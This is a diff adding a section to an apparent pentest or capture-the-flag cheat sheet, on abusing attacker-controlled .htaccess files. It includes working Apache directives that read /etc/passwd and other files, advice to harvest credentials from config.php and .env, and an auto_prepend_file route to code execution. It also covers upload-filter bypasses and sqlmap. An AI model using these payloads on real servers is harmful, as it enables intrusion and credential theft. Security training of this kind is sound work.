@@ -62,6 +62,25 @@ magic bytes. Bypasses: `.phtml`, `.php5`, `.phar`, double extension,
 `.htaccess` upload, null byte on old stacks, valid image header + PHP tail.
 Then find where the file landed (fuzz `/uploads/`, `/images/`, the response).
 
+**Attacker-controlled `.htaccess`** — when you can write a served directory (an
+upload sink, a user-home hoster, `mod_userdir`), the `.htaccess` itself is the
+payload, and what it grants is set by `AllowOverride`. Probe the grant first:
+`AddType`/`AddHandler`/`SetHandler`/`Header`/`ErrorDocument` accepted = FileInfo;
+`Options`/`php_flag` returning 500 = Options *not* delegated. With FileInfo but
+no mod_php, you still get:
+```apache
+# arbitrary file read as the web user via ap_expr — no scripting needed
+ErrorDocument 404 "%{file:/etc/passwd}"                 # renders file into the 404 body, no size limit
+Header always set X-L "expr=%{base64:%{file:/path}}"    # small files; base64 avoids the newline-500 and the ~8KB header cap
+SetHandler server-status                                # re-expose a globally-403 mod_status from your own dir
+```
+`%{file:}` reads regular files the worker can open (empty on `/proc` size-0
+files). This is a full source-disclosure primitive — use it exactly like the
+`php://filter` LFI outcome: read `config.php`/`stats.php`/`.env` for credentials
+first. With mod_php present, `.htaccess` `php_value auto_prepend_file` /
+`AddHandler ... .php` on your upload is direct RCE instead. (Also note
+CVE-2025-66200, a `mod_userdir`+`suexec` bypass via FileInfo, ≤ 2.4.65.)
+
 **SQL injection** — test `'`, `"`, `\`, then order-by/union. Once confirmed, go
 straight to `sqlmap` for extraction rather than hand-rolling:
 ```bash
